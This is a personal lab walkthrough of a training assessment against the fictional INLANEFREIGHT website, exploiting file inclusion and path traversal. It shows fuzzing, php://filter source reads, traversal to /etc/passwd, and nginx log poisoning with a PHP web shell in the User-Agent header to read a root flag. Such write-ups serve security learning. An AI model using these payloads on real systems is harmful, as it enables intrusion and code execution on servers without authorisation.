
# Brief

The company `INLANEFREIGHT` has contracted you to perform a web application assessment against one of their public-facing websites. They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application checking for file inclusion and path traversal vulnerabilities.

Find the vulnerabilities and submit a final flag using the skills we covered in the module sections to complete this module.

Don't forget to think outside the box!


# Questions

1. Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the `/` root directory of the file system. Submit the contents of the flag as your answer.

```sh
# Access the target
http://94.237.61.242:48242

# Looks like the an updated version of the website we have been dealing with. Get the filtering size
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.61.242:48242/FUZZ' 

:: Progress: [558/6453] :: Job [1/1] :: 259 req/sec :: Duration: [0:00:02] :: Eradvbase                 [Status: 200, Size: 15829, Words: 3435, Lines: 401, Duration: 152ms]
...

# fuzz
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.61.242:48242/FUZZ' -fs 15829


css                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 150ms]
images                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 189ms]
js                      [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 150ms]
:: Progress: [6453/6453] :: Job [1/1] :: 263 req/sec :: Duration: [0:00:25] :: Errors: 0 ::


# While running, navigate the website and also come across
http://94.237.61.242:48242/index.php?page=about
http://94.237.61.242:48242/index.php?page=contact


# The page parameter seems to be changing. Are there any other parameters? Get the filtering size
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.61.242:48242/index.php?FUZZ=value'

# Fuzz
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.61.242:48242/index.php?FUZZ=value' -fs 15829

page                    [Status: 200, Size: 4322, Words: 797, Lines: 118, Duration: 151ms]


# Seems to be the only valid parameter from the wordlist in our posession. Can we find valid LFI payload? Get the filtering size
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.61.242:48242/index.php?page=FUZZ' -fs 2287

...
db.php                  [Status: 200, Size: 4322, Words: 797, Lines: 118, Duration: 159ms]
...

# Fuzz
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.61.242:48242/index.php?page=FUZZ' -fs 4322


# Way too many working payloads. Verify one
http://94.237.61.242:48242/index.php?page=../config.php

Invalid input detected!

http://94.237.61.242:48242/index.php?page=../../../../../../../../../../etc/passwd

http://94.237.61.242:48242/index.php?page=..2f..2f..2f..2fetc2fpasswd

# Same result. Do I need encoding? Or bypasses? Or Remote? Or logs?
http://94.237.61.242:48242/index.php?page=http://10.10.15.161:8000/index.php

# No call back to our server. But no invalid input detected either. No cookies either. Bit does it mean we can't try the logs?
curl -s 'http://94.237.61.242:48242/index.php?page=..2f..2f..2f..2fetc2fpasswd'


# Ok. Still Invalid Input detected. Doesn't look like we are getting anywhere. Go back to the course and try the PHP wrappers. Start with the easy one
curl -s 'http://94.237.61.242:48242/index.php?page=php://input&cmd=id'


# No invalid input detected error. But also no id. Try the expect wrapper
curl -s 'http://94.237.61.242:48242/index.php?page=expect://id'


# No Invalid Input detected. But also, no id output. Try the data
curl -s 'http://94.237.61.242:48242/index.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini'


# Nothing + Invalid input detected. Looks like some sanitizations are happening. When I request
http://94.237.61.242:48242/index.php?page=http://10.10.15.161:8000/index.php


# No Invalid Input Detected output. If I remove the .., as it seems to be the issue, what do I have left? Is there anything else hidden in the pages? Nothing in the source code that I can see. Per Gemini, `Start with the `php://filter` wrapper, as it's the most promising given your current observations.`. Start with the options
http://94.237.61.242:48242/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

# Nothing. Attempting to read `index.php` (to understand the application's code): 
http://94.237.61.242:48242/index.php?page=php://filter/read=convert.base64-encode/resource=index.php


# Nothing. After more chat with gemini, it appears that I can read the file while omitting the `.php` extension
http://94.237.61.242:48242/index.php?page=php://filter/convert.base64-encode/resource=index


# Bingo. Base64 output. Decode
echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDx0aXRsZT5JbmxhbmVGcmVpZ2h0PC90aXRsZT4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9UG9wcGluczoyMDAsMzAwLDQwMCw3MDAsOTAwfERpc3BsYXkrUGxheWZhaXI6MjAwLDMwMCw0MDAsNzAwIj4gCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImZvbnRzL2ljb21vb24vc3R5bGUuY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9tYWduaWZpYy1wb3B1cC5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvanF1ZXJ5LXVpLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wuY2Fyb3VzZWwubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wudGhlbWUuZGVmYXVsdC5taW4uY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAtZGF0ZXBpY2tlci5jc3MiPgoKICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iZm9udHMvZmxhdGljb24vZm9udC9mbGF0aWNvbi5jc3MiPgoKCgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvYW9zLmNzcyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICAgIAogIDwvaGVhZD4KICA8Ym9keT4KICAKICA8ZGl2IGNsYXNzPSJzaXRlLXdyYXAiPgoKICAgIDxkaXYgY2xhc3M9InNpdGUtbW9iaWxlLW1lbnUiPgogICAgICA8ZGl2IGNsYXNzPSJzaXRlLW1vYmlsZS1tZW51LWhlYWRlciI+CiAgICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1jbG9zZSBtdC0zIj4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJpY29uLWNsb3NlMiBqcy1tZW51LXRvZ2dsZSI+PC9zcGFuPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1ib2R5Ij48L2Rpdj4KICAgIDwvZGl2PgogICAgCiAgICA8aGVhZGVyIGNsYXNzPSJzaXRlLW5hdmJhciBweS0zIiByb2xlPSJiYW5uZXIiPgoKICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICAgIAogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTExIGNvbC14bC0yIj4KICAgICAgICAgICAgPGgxIGNsYXNzPSJtYi0wIj48YSBocmVmPSJpbmRleC5waHAiIGNsYXNzPSJ0ZXh0LXdoaXRlIGgyIG1iLTAiPklubGFuZUZyZWlnaHQ8L2E+PC9oMT4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC0xMCBkLW5vbmUgZC14bC1ibG9jayI+CiAgICAgICAgICAgIDxuYXYgY2xhc3M9InNpdGUtbmF2aWdhdGlvbiBwb3NpdGlvbi1yZWxhdGl2ZSB0ZXh0LXJpZ2h0IiByb2xlPSJuYXZpZ2F0aW9uIj4KCiAgICAgICAgICAgICAgPHVsIGNsYXNzPSJzaXRlLW1lbnUganMtY2xvbmUtbmF2IG14LWF1dG8gZC1ub25lIGQtbGctYmxvY2siPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJhY3RpdmUiPjxhIGhyZWY9ImluZGV4LnBocCI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWluZHVzdHJpZXMiPkluZHVzdHJpZXM8L2E+PC9saT4KICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0PC9hPjwvbGk+CgkJPD9waHAgCgkJICAvLyBlY2hvICc8bGk+PGEgaHJlZj0iaWxmX2FkbWluL2luZGV4LnBocCI+QWRtaW48L2E+PC9saT4nOyAKCQk/PgogICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvbmF2PgogICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgIDxkaXYgY2xhc3M9ImQtaW5saW5lLWJsb2NrIGQteGwtbm9uZSBtbC1tZC0wIG1yLWF1dG8gcHktMyIgc3R5bGU9InBvc2l0aW9uOiByZWxhdGl2ZTsgdG9wOiAzcHg7Ij48YSBocmVmPSIjIiBjbGFzcz0ic2l0ZS1tZW51LXRvZ2dsZSBqcy1tZW51LXRvZ2dsZSB0ZXh0LXdoaXRlIj48c3BhbiBjbGFzcz0iaWNvbi1tZW51IGgzIj48L3NwYW4+PC9hPjwvZGl2PgoKICAgICAgICAgIDwvZGl2PgoKICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICAgIAogICAgPC9oZWFkZXI+CgogIAoKICAgIDxkaXYgY2xhc3M9InNpdGUtYmxvY2tzLWNvdmVyIG92ZXJsYXkiIHN0eWxlPSJiYWNrZ3JvdW5kLWltYWdlOiB1cmwoaW1hZ2VzL2hlcm9fYmdfMS5qcGcpOyIgZGF0YS1hb3M9ImZhZGUiIGRhdGEtc3RlbGxhci1iYWNrZ3JvdW5kLXJhdGlvPSIwLjUiPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyBhbGlnbi1pdGVtcy1jZW50ZXIganVzdGlmeS1jb250ZW50LWNlbnRlciB0ZXh0LWNlbnRlciI+CgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTgiIGRhdGEtYW9zPSJmYWRlLXVwIiBkYXRhLWFvcy1kZWxheT0iNDAwIj4KICAgICAgICAgICAgCgogICAgICAgICAgICA8aDEgY2xhc3M9InRleHQtd2hpdGUgZm9udC13ZWlnaHQtbGlnaHQgbWItNSB0ZXh0LXVwcGVyY2FzZSBmb250LXdlaWdodC1ib2xkIj5Xb3JsZHdpZGUgRnJlaWdodCBTZXJ2aWNlczwvaDE+CiAgICAgICAgICAgIDxwPjxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgcHktMyBweC01IHRleHQtd2hpdGUiPkdldCBTdGFydGVkITwvYT48L3A+CgogICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+ICAKCjw/cGhwCmlmKCFpc3NldCgkX0dFVFsncGFnZSddKSkgewogIGluY2x1ZGUgIm1haW4ucGhwIjsKfQplbHNlIHsKICAkcGFnZSA9ICRfR0VUWydwYWdlJ107CiAgaWYgKHN0cnBvcygkcGFnZSwgIi4uIikgIT09IGZhbHNlKSB7CiAgICBpbmNsdWRlICJlcnJvci5waHAiOwogIH0KICBlbHNlIHsKICAgIGluY2x1ZGUgJHBhZ2UgLiAiLnBocCI7CiAgfQp9Cj8+CiAgICA8Zm9vdGVyIGNsYXNzPSJzaXRlLWZvb3RlciI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93IHB0LTUgbXQtNSB0ZXh0LWNlbnRlciI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJib3JkZXItdG9wIHB0LTUiPgogICAgICAgICAgICA8cD4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgQ29weXJpZ2h0ICZjb3B5OzxzY3JpcHQ+ZG9jdW1lbnQud3JpdGUobmV3IERhdGUoKS5nZXRGdWxsWWVhcigpKTs8L3NjcmlwdD4gQWxsIHJpZ2h0cyByZXNlcnZlZCB8IFRoaXMgdGVtcGxhdGUgaXMgbWFkZSB3aXRoIDxpIGNsYXNzPSJpY29uLWhlYXJ0IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiBieSA8YSBocmVmPSJodHRwczovL2NvbG9ybGliLmNvbSIgdGFyZ2V0PSJfYmxhbmsiID5Db2xvcmxpYjwvYT4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgPC9mb290ZXI+CiAgPC9kaXY+CgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnktMy4zLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LW1pZ3JhdGUtMy4wLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LXVpLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvcG9wcGVyLm1pbi5qcyI+PC9zY3JpcHQ+CiAgPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9vd2wuY2Fyb3VzZWwubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LnN0ZWxsYXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmNvdW50ZG93bi5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnkubWFnbmlmaWMtcG9wdXAubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYm9vdHN0cmFwLWRhdGVwaWNrZXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYW9zLmpzIj48L3NjcmlwdD4KCiAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgCiAgPC9ib2R5Pgo8L2h0bWw+Cg==" | base64 -d

<!DOCTYPE html>
<html lang="en">
  <head>
    <title>InlaneFreight</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:200,300,400,700,900|Display+Playfair:200,300,400,700"> 
    <link rel="stylesheet" href="fonts/icomoon/style.css">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/magnific-popup.css">
    <link rel="stylesheet" href="css/jquery-ui.css">
    <link rel="stylesheet" href="css/owl.carousel.min.css">
    <link rel="stylesheet" href="css/owl.theme.default.min.css">

    <link rel="stylesheet" href="css/bootstrap-datepicker.css">

    <link rel="stylesheet" href="fonts/flaticon/font/flaticon.css">



    <link rel="stylesheet" href="css/aos.css">

    <link rel="stylesheet" href="css/style.css">
    
  </head>
  <body>
  
  <div class="site-wrap">

    <div class="site-mobile-menu">
      <div class="site-mobile-menu-header">
        <div class="site-mobile-menu-close mt-3">
          <span class="icon-close2 js-menu-toggle"></span>
        </div>
      </div>
      <div class="site-mobile-menu-body"></div>
    </div>
    
    <header class="site-navbar py-3" role="banner">

      <div class="container">
        <div class="row align-items-center">
          
          <div class="col-11 col-xl-2">
            <h1 class="mb-0"><a href="index.php" class="text-white h2 mb-0">InlaneFreight</a></h1>
          </div>
          <div class="col-12 col-md-10 d-none d-xl-block">
            <nav class="site-navigation position-relative text-right" role="navigation">

              <ul class="site-menu js-clone-nav mx-auto d-none d-lg-block">
                <li class="active"><a href="index.php">Home</a></li>
                <li><a href="index.php?page=about">About Us</a></li>
                <li><a href="index.php?page=industries">Industries</a></li>
                <li><a href="index.php?page=contact">Contact</a></li>
		<?php 
		  // echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
		?>
              </ul>
            </nav>
          </div>


          <div class="d-inline-block d-xl-none ml-md-0 mr-auto py-3" style="position: relative; top: 3px;"><a href="#" class="site-menu-toggle js-menu-toggle text-white"><span class="icon-menu h3"></span></a></div>

          </div>

        </div>
      </div>
      
    </header>

  

    <div class="site-blocks-cover overlay" style="background-image: url(images/hero_bg_1.jpg);" data-aos="fade" data-stellar-background-ratio="0.5">
      <div class="container">
        <div class="row align-items-center justify-content-center text-center">

          <div class="col-md-8" data-aos="fade-up" data-aos-delay="400">
            

            <h1 class="text-white font-weight-light mb-5 text-uppercase font-weight-bold">Worldwide Freight Services</h1>
            <p><a href="#" class="btn btn-primary py-3 px-5 text-white">Get Started!</a></p>

          </div>
        </div>
      </div>
    </div>  

<?php
if(!isset($_GET['page'])) {
  include "main.php";
}
else {
  $page = $_GET['page'];
  if (strpos($page, "..") !== false) {
    include "error.php";
  }
  else {
    include $page . ".php";
  }
}
?>
    <footer class="site-footer">
        <div class="row pt-5 mt-5 text-center">
          <div class="col-md-12">
            <div class="border-top pt-5">
            <p>
            <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
            Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="icon-heart" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank" >Colorlib</a>
            <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
            </p>
            </div>
          </div>
    </footer>
  </div>

  <script src="js/jquery-3.3.1.min.js"></script>
  <script src="js/jquery-migrate-3.0.1.min.js"></script>
  <script src="js/jquery-ui.js"></script>
  <script src="js/popper.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/owl.carousel.min.js"></script>
  <script src="js/jquery.stellar.min.js"></script>
  <script src="js/jquery.countdown.min.js"></script>
  <script src="js/jquery.magnific-popup.min.js"></script>
  <script src="js/bootstrap-datepicker.min.js"></script>
  <script src="js/aos.js"></script>

  <script src="js/main.js"></script>
    
  </body>
</html>

# Reading the file, we find a php comment with a new endpoint
<?php 
  // echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
?>

# Access it? Or not. Page failed. Had to refresh the target. Access the new endpoint.
http://94.237.57.115:49194/ilf_admin/index.php


# Find the new endpoint with possible new LFI?
http://94.237.57.115:49194/ilf_admin/index.php?log=chat.log
http://94.237.57.115:49194/ilf_admin/index.php?log=http.log
http://94.237.57.115:49194/ilf_admin/index.php?log=system.log


# Read each of the log? Or Fuzz? Get the FS
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.57.115:49194/ilf_admin/index.php?log=FUZZ'

...
../../../../../../../dev [Status: 200, Size: 2046, Words: 150, Lines: 102, Duration: 152ms
...


# Fuzz
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.57.115:49194/ilf_admin/index.php?log=FUZZ' -fs 2046


# Lower amount of payload this time. Verify
curl -s 'http://94.237.57.115:49194/ilf_admin/index.php?log=../../../../../etc/passwd'

...
<pre>root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
...
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
...


# Business!!! Where is the flag now and how to read it?
http://94.237.57.115:49194/ilf_admin/index.php?log=../../../../../flag.txt


# Wishful thinking. Niente! Is this another wrapper? If so, can we try a RCE? Let's find info about the server from response
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Wed, 30 Jul 2025 23:16:05 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: PHP/7.3.22
Content-Length: 152373


# Nginx files are stored, per the course, in /etc/php/X.Y/fpm/php.ini. Let's verify
http://94.237.57.115:49194/ilf_admin/index.php?log=../../../../../etc/php/7.3/fpm/php.ini


# Nope. Try with the data wrapper
curl -s "http://94.237.57.115:49194/ilf_admin/index.php?log=php://filter/read=convert.base64-encode/resource=../../../../../etc/php/7.3/fpm/php.ini"


# Nope. Can I read the logs? Nginx will be stored at /var/log/nginx/
http://94.237.57.115:49194/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log

curl -s "http://94.237.57.115:49194/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log"

...
10.30.18.139 - - [30/Jul/2025:23:45:05 +0000] "GET /ilf_admin/c.css HTTP/1.1" 404 125 "http://94.237.57.115:49194/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log" "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0"
10.30.18.139 - - [30/Jul/2025:23:45:06 +0000] "GET /ilf_admin/js/bootstrap.js HTTP/1.1" 404 125 "http://94.237.57.115:49194/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log" "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0"
...


# Business. Per the course, try the User Agent, since it's included in the logs. In Burp
User-Agent: GT POISON


# Request the logs
curl -s "http://94.237.57.115:49194/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log"

...
10.30.18.139 - - [30/Jul/2025:23:55:15 +0000] "GET /ilf_admin/ HTTP/1.1" 200 929 "-" "GT POISON"
...


# Now, let's try the shell
User-Agent: <?php system(\$_GET['cmd']); ?>

# Get the logs
curl -s "http://94.237.57.115:49194/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id"


# Nothing. Even the logs I was seeing before disapeared. Reviewing the code, I realize that there's an unaccounted \ in the payload in Burp. UGH. Refresh the target and start again

echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://94.237.48.12:38730/ilf_admin/" -H @Poison

# Access the logs
curl -s "http://94.237.48.12:38730/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id"


# Nothing. So, let's try this using BURP and send everything at once
GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=ls%20/ HTTP/1.1
Host: 94.237.48.12:38730
User-Agent: <?php system(\$_GET['cmd']); ?>

...
10.30.18.213 - - [31/Jul/2025:00:16:44 +0000] "GET /ilf_admin/ HTTP/1.1" 200 2047 "-" "bin
dev
etc
flag_dacc60f2348d.txt
home
lib
...
"
10.30.18.213 - - [31/Jul/2025:00:17:08 +0000] "GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id HTTP/1.1" 200 2348 "-" "curl/7.88.1"

# This worked. But when I tried to send separately as below, it didn't
curl -s 'http://94.237.48.12:38730/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=ls%20/' 

# Let's read the flag now
GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat%20/flag_dacc60f2348d.txt HTTP/1.1
Host: 94.237.48.12:38730
User-Agent: <?php system($_GET['cmd']); ?>


# NIENTE!!!!! WTH!!!!! What does the error.log says?
http://94.237.48.12:38730/ilf_admin/index.php?log=../../../../../var/log/nginx/error.log

...
2025/07/31 00:28:18 [error] 10#10: *50 FastCGI sent in stderr: "PHP message: PHP Parse error:  syntax error, unexpected '$_GET' (T_VARIABLE), expecting ')' in /var/log/nginx/access.log on line 49" while reading response header from upstream, client: 10.30.18.213, server: _, request: "GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=ls%20/ HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "94.237.48.12:38730"
2025/07/31 00:28:51 [error] 10#10: *52 FastCGI sent in stderr: "PHP message: PHP Parse error:  syntax error, unexpected '$_GET' (T_VARIABLE), expecting ')' in /var/log/nginx/access.log on line 49" while reading response header from upstream, client: 10.30.18.213, server: _, request: "GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat%20/flag_dacc60f2348d.txt HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "94.237.48.12:38730"
...

# Per Gemini, Set your User-Agent header to: `<?php system($_GET['c']); ?>`

# Nope! Given that our previous payload worked, let's refresh the target. AGAIN!!!! Start from the known good
http://83.136.255.102:45733/ilf_admin/index.php?log=../../../../../etc/passwd


# Got straigth to the flag since we have all the building blocs
GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat%20/flag_dacc60f2348d.txt HTTP/1.1
Host: 83.136.255.102:45733
User-Agent: <?php system(\$_GET['cmd']); ?>

...
10.30.18.249 - - [31/Jul/2025:00:43:00 +0000] "GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log HTTP/1.1" 200 1472 "-" "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0"
10.30.18.249 - - [31/Jul/2025:00:44:07 +0000] "GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat%20/flag_dacc60f2348d.txt HTTP/1.1" 200 1488 "-" "******"


# At last, finally get it. Repeating the same request in Burp and requesting it through cURL returns nothing
curl -s "http://83.136.255.102:45733/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=cat%20/flag_dacc60f2348d.txt"

# Not sure if it's because the lab is unstable or it's something I need to change in my payload. Either way, module completed.
```

# Reflections
For once, I am leaving the file names in the walkthrough. If it can save someone from losing their hair. 
